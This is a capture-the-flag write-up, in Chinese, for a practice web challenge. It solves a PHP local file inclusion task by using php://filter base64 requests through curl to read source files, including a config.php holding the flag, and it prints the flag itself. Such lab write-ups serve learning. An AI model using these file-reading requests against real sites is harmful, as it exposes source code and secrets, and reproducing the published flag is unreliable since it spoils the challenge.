# PHM #17 Web — LFI

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 60 |

## 題目

> What this admin's password? That is not important at all, just get the flag.
>
> Tips: LFI, `php://filter`
>
> 連結: [`/lfi/`](https://ctf.hackme.quest/lfi/)

## 分析

主頁 nav 有:
```html
<a href="?page=pages/index">Home</a>
<a href="?page=pages/intro">Introduction</a>
<!-- There is no flag <a href="?page=pages/flag">Flag</a> -->
<a href="?page=pages/login">Login</a>
```

HTML 註解透露 `pages/flag`. `?page=pages/flag` 回 "Can you read the flag?".

### `php://filter` 讀原始碼

```bash
curl 'https://ctf.hackme.quest/lfi/?page=php://filter/convert.base64-encode/resource=pages/flag' \
  | grep -oE '[A-Za-z0-9+/=]{20,}' | tail -1 | base64 -d
# -> Can you read the flag<?php require('config.php'); ?>?
```

`pages/flag.php` 只是 `require('config.php')`, 不會印出來. 需要**直接讀 config.php**.

### 相對路徑踩雷

`require('config.php')` 在 `pages/flag.php` 內 → 真正路徑是 `pages/config.php`:

```bash
curl 'https://ctf.hackme.quest/lfi/?page=php://filter/convert.base64-encode/resource=pages/config' \
  | grep -oE '[A-Za-z0-9+/=]{20,}' | tail -1 | base64 -d
# -> <?php
# -> $flag = "FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}";
```

## Flag

```
FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}
```

## 感想

教科書 `php://filter` LFI, 唯一要注意: `require('config.php')` 從 `pages/flag.php` 執行時, config.php 在 `pages/config.php` (相對 flag.php 的位置), 不是 root 下的 `config.php`.
